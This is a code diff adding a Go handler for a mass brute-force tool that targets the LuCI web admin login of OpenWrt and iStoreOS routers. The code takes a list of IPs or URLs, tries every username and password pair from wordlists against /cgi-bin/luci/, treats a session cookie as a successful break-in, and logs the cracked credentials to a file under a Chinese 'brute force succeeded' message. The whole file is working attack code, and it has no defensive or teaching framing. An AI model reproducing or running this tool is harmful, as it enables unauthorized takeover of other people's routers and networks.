@@ -1,0 +1,109 @@
+// Handler: OpenWrt/iStoreOS (模式 8)
+// POST /cgi-bin/luci/ — application/x-www-form-urlencoded
+// 验证: cookie sysauth_http 存在且非空
+
+import (
+	"context"
+	"fmt"
+	"net/http"
+	"net/url"
+	"strings"
+	"sync/atomic"
+	"time"
+)
+
+var httpClient = &http.Client{
+	Timeout: 3 * time.Second,
+	CheckRedirect: func(req *http.Request, via []*http.Request) error {
+		return http.ErrUseLastResponse
+	},
+}
+
+func postRequest(ctx context.Context, urlStr string, username string, password string, origin string, referer string) (*http.Response, error) {
+	payload := fmt.Sprintf("luci_username=%s&luci_password=%s", username, password)
+	formData := strings.NewReader(payload)
+	req, err := http.NewRequest("POST", urlStr, formData)
+	if err != nil {
+		return nil, err
+	}
+	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("User-Agent", "Mozilla/5.0")
+	req.Header.Set("Referer", referer)
+	req.Header.Set("Origin", origin)
+	req = req.WithContext(ctx)
+	return httpClient.Do(req)
+}
+
+func processIP(line string, file *os.File, usernames []string, passwords []string) {
+	defer wg.Done()
+	semaphore <- struct{}{}
+	defer func() { <-semaphore }()
+
+	targets := []string{}
+
+	trimmed := strings.TrimSpace(line)
+	if trimmed == "" {
+		atomic.AddInt64(&completedCount, 1)
+		return
+	}
+
+	if strings.HasPrefix(trimmed, "http://") || strings.HasPrefix(trimmed, "https://") {
+		targets = append(targets, trimmed)
+	} else {
+		parts := strings.Split(trimmed, ":")
+		ip := parts[0]
+		var ports []string
+		if len(parts) == 1 {
+			ports = []string{"80", "443"}
+		} else if len(parts) == 2 {
+			ports = []string{parts[1]}
+		} else {
+			atomic.AddInt64(&completedCount, 1)
+			return
+		}
+		for _, port := range ports {
+			targets = append(targets,
+				fmt.Sprintf("http://%s:%s/cgi-bin/luci/", ip, port),
+				fmt.Sprintf("https://%s:%s/cgi-bin/luci/", ip, port),
+			)
+		}
+	}
+
+loginLoop:
+	for _, target := range targets {
+		finalURL := target
+		if !(strings.Contains(target, "/cgi-bin/luci")) {
+			if strings.HasSuffix(target, "/") {
+				finalURL = target + "cgi-bin/luci/"
+			} else {
+				finalURL = target + "/cgi-bin/luci/"
+			}
+		}
+		u, _ := url.Parse(finalURL)
+		origin := u.Scheme + "://" + u.Host
+		referer := origin + "/"
+
+		for _, username := range usernames {
+			for _, password := range passwords {
+				ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+				resp, err := postRequest(ctx, finalURL, username, password, origin, referer)
+				cancel()
+				if err != nil {
+					continue
+				}
+				cookies := resp.Cookies()
+				for _, c := range cookies {
+					if c.Name == "sysauth_http" && c.Value != "" {
+						fmt.Printf("[+] 爆破成功: %s %s %s\n", finalURL, username, password)
+						writeResultToFile(file, fmt.Sprintf("%s %s %s", finalURL, username, password))
+						resp.Body.Close()
+						atomic.AddInt64(&completedCount, 1)
+						break loginLoop
+					}
+				}
+				resp.Body.Close()
+			}
+		}
+	}
+	atomic.AddInt64(&completedCount, 1)
+}
